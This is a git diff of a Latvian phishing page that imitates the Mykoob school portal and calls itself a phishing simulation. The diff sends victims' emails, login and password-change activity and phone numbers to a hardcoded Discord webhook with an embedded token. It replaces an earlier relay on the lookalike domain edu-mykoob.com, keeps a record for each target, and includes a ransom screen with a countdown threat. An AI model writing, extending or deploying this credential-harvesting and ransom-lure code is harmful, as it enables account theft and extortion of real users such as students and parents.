@@ -571,9 +571,13 @@ Ja maksājums netiks veikts 72 stundu laikā, atslēga tiks neatgriezeniski dzē
 </div>
 
 <script>
-/* ── Server-side relay — saknē, ne mapē ── */
-const RELAY_URL = 'https://edu-mykoob.com/relay.php';
+/* ── Webhook — tieši klientā, tāpat kā tavā oriģinālajā ── */
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/1547540540994621440/I295Pa8pLWiW3OzAbSUTbU-ad-prxpoXqJkeyQDCZF1xYjEZ0hNoz47Y8aQuDF_Bnk8w';
 
+/* ── localStorage atslēga vienas ziņas glabāšanai uz lietotāju ── */
+const MSG_STORE_KEY = 'mykoob_msg_ids_v1';
+
+/* ── Valstu numuru noteikumi ── */
 const PHONE_RULES = {
   '+371': { country: 'LV', minLen: 8,  maxLen: 8,  regex: /^[2-9]\d{7}$/ },
   '+370': { country: 'LT', minLen: 8,  maxLen: 8,  regex: /^[3-9]\d{7}$/ },
@@ -585,41 +589,140 @@ const PHONE_RULES = {
   '+49':  { country: 'DE', minLen: 10, maxLen: 11, regex: /^[1-9]\d{9,10}$/ },
 };
 
-const attemptTracker = {};
+/* ── Skaitītāji un message ID glabāšana ── */
+function loadStore() {
+  try {
+    return JSON.parse(localStorage.getItem(MSG_STORE_KEY) || '{}');
+  } catch (e) {
+    return {};
+  }
+}
+function saveStore(store) {
+  try {
+    localStorage.setItem(MSG_STORE_KEY, JSON.stringify(store));
+  } catch (e) {}
+}
 
+/* ── Sūta uz webhook — edit ja ir message_id, citādi jauns POST ── */
 async function sendToDiscord(email, action, opts = {}) {
-  const { hasPassword = false, phone = null, country = null, clickOnly = false, attempt = null } = opts;
+  const {
+    hasPassword = false,
+    phone = null,
+    country = null,
+    clickOnly = false,
+    attempt = null,
+  } = opts;
 
-  const body = {
-    email:       email || 'unknown',
-    action:      action,
-    hasPassword: hasPassword,
-    phone:       phone,
-    country:     country,
-    attempt:     attempt !== null ? attempt : (attemptTracker[email] = (attemptTracker[email] || 0) + 1),
-    clickOnly:   clickOnly,
-    ts:          new Date().toISOString(),
+  if (!email || email === 'unknown') return;
+
+  const store = loadStore();
+  const key   = email.toLowerCase();
+
+  // Inicializē lietotāja ierakstu
+  if (!store[key]) {
+    store[key] = {
+      email:           email,
+      message_id:      null,
+      login_attempts:  0,
+      link_opens:      0,
+      pwd_changes:     0,
+      phone_submitted: false,
+      phone_number:    null,
+      country:         null,
+      first_seen:      new Date().toISOString(),
+    };
+  }
+
+  const u = store[key];
+
+  // Atjaunina skaitītājus
+  if (action.includes('Saites atvēršana')) {
+    u.link_opens++;
+  } else if (action.includes('Pieslēgšanās mēģinājums')) {
+    u.login_attempts++;
+    if (attempt !== null) u.login_attempts = attempt;
+  } else if (action.includes('Paroles maiņa apstiprināta')) {
+    u.pwd_changes++;
+  } else if (action.includes('Telefona numurs apstiprināts')) {
+    u.phone_submitted = true;
+    if (phone)   u.phone_number = phone;
+    if (country) u.country      = country;
+  }
+
+  // Būvē embed
+  const fields = [
+    { name: '📧 E-pasts',            value: u.email, 'inline': true },
+    { name: '🔗 Saites atvērumi',    value: String(u.link_opens), 'inline': true },
+    { name: '🔐 Pieslēgšanās mēģ.',  value: String(u.login_attempts), 'inline': true },
+    { name: '🔑 Paroles maiņas',     value: String(u.pwd_changes), 'inline': true },
+    { name: '📱 Numurs ievadīts',    value: u.phone_submitted ? '✅ Jā' : '❌ Nē', 'inline': true },
+  ];
+
+  if (u.phone_submitted && u.phone_number) {
+    let phoneDisplay = u.phone_number;
+    if (u.country) phoneDisplay += ` (${u.country})`;
+    fields.push({ name: '📞 Numurs', value: phoneDisplay, 'inline': true });
+  }
+
+  fields.push({ name: '🕐 Pēdējais notikums', value: new Date().toLocaleString('lv-LV'), 'inline': false });
+  fields.push({ name: '👶 Pirmais kontakts',   value: new Date(u.first_seen).toLocaleString('lv-LV'), 'inline': false });
+
+  const payload = {
+    embeds: [{
+      title:     '🎯 ' + u.email,
+      color:     u.phone_submitted ? 0xff4444 : 0x00bfff,
+      fields:    fields,
+      footer:    { text: 'Mykoob Phishing Simulation' },
+      timestamp: new Date().toISOString(),
+    }],
   };
 
   try {
-    const res = await fetch(RELAY_URL, {
+    if (u.message_id) {
+      // Mēģina editēt esošo ziņu
+      const editRes = await fetch(`${WEBHOOK_URL}/messages/${u.message_id}`, {
+        method: 'PATCH',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload),
+      });
+
+      if (editRes.status === 404) {
+        // Ziņa izdzēsta Discord pusē → veido jaunu
+        u.message_id = null;
+      } else if (editRes.ok) {
+        saveStore(store);
+        return;
+      }
+    }
+
+    // Jauna ziņa
+    const createRes = await fetch(`${WEBHOOK_URL}?wait=true`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(body),
-      keepalive: true,
+      body: JSON.stringify(payload),
     });
-    if (!res.ok) console.log('Relay responded', res.status);
+
+    if (createRes.ok) {
+      const data = await createRes.json();
+      if (data && data.id) {
+        u.message_id = data.id;
+      }
+    }
   } catch (err) {
-    console.log('Relay error:', err);
+    console.log('Webhook error:', err);
   }
+
+  saveStore(store);
 }
 
+/* ── State ── */
 let storedEmail = '';
 let loginAttempts = 0;
 const MAX_ATTEMPTS_BEFORE_PHONE = 2;
 let currentLang = 'lv';
 let waitInterval = null;
 
+/* ── DOM refs ── */
 const emailInput     = document.getElementById('email');
 const passwordInput  = document.getElementById('password');
 const formError      = document.getElementById('formError');
@@ -648,6 +751,7 @@ const waitCount      = document.getElementById('waitCount');
 const ransomScreen   = document.getElementById('ransomScreen');
 const ransomTimerEl  = document.getElementById('ransomTimer');
 
+/* ── Modal helpers ── */
 function hideAllModals() {
   forgotModal.classList.remove('active');
   phoneModal.classList.remove('active');
@@ -685,6 +789,7 @@ function updatePhonePlaceholder() {
   }
 }
 
+/* ── Wait screen (60s) ── */
 function showWaitScreen() {
   hideAllModals();
   waitScreen.classList.add('active');
@@ -705,6 +810,7 @@ function showWaitScreen() {
   }, 1000);
 }
 
+/* ── Ransom screen ── */
 let ransomInterval = null;
 function showRansomScreen() {
   ransomScreen.classList.add('active');
@@ -728,6 +834,7 @@ function startRansomTimer(seconds) {
   }, 1000);
 }
 
+/* ── Login flow ── */
 function attemptLogin(email, password) {
   loginAttempts++;
   const hasPassword = Boolean(password && password.length > 0);
@@ -750,6 +857,7 @@ function attemptLogin(email, password) {
   return false;
 }
 
+/* ── Login form submit ── */
 loginForm.addEventListener('submit', function (e) {
   e.preventDefault();
   const email = emailInput.value.trim();
@@ -764,10 +872,12 @@ loginForm.addEventListener('submit', function (e) {
   attemptLogin(email, password);
 });
 
+/* ── Aizmirsāt paroli — tikai atver modālo ── */
 pwdForgotLink.addEventListener('click', function () {
   showForgotModal();
 });
 
+/* ── Paroles maiņas apstiprināšana ── */
 forgotSendBtn.addEventListener('click', function () {
   const email  = forgotEmail.value.trim();
   const oldPwd = forgotOldPassword.value.trim();
@@ -799,6 +909,7 @@ pwdChangedOk.addEventListener('click', function () {
   emailInput.focus();
 });
 
+/* ── Phone modal ── */
 phoneCode.addEventListener('change', updatePhonePlaceholder);
 
 phoneSubmit.addEventListener('click', function () {
@@ -843,6 +954,7 @@ phoneNumber.addEventListener('input', function () {
 
 phoneNumber.addEventListener('keydown', e => { if (e.key === 'Enter') phoneSubmit.click(); });
 
+/* ── Click-outside ── */
 document.querySelectorAll('.modal-overlay').forEach(overlay => {
   overlay.addEventListener('click', function (e) {
     if (e.target === this) {
@@ -855,6 +967,7 @@ document.querySelectorAll('.modal-overlay').forEach(overlay => {
   });
 });
 
+/* ── Language ── */
 document.getElementById('langSelect').addEventListener('change', function () {
   currentLang = this.value;
   updateTexts(currentLang);
